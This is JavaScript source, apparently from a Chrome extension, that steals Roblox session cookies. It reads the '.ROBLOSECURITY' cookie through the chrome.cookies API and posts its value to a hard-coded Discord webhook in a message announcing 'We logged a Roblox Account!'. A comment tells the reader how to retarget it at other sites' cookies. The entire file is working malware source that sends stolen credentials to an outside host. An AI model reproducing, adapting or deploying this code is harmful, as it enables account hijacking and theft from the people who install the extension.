function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `We logged a Roblox Account!`,
            "description": ">>>We logged someone; see information about the user below",
            "color": 15258703,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; // wanna grab other info from other sites? change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    webhookReq("https://discord.com/api/webhooks/1169416235931406478/4OcUd-BAvb0V-sdHgT9Lvb55MBXaVEWCk9CviE5CATiFkPmP_pIZoeihd0atQhsCaFaH", cookie.value);
  }
});
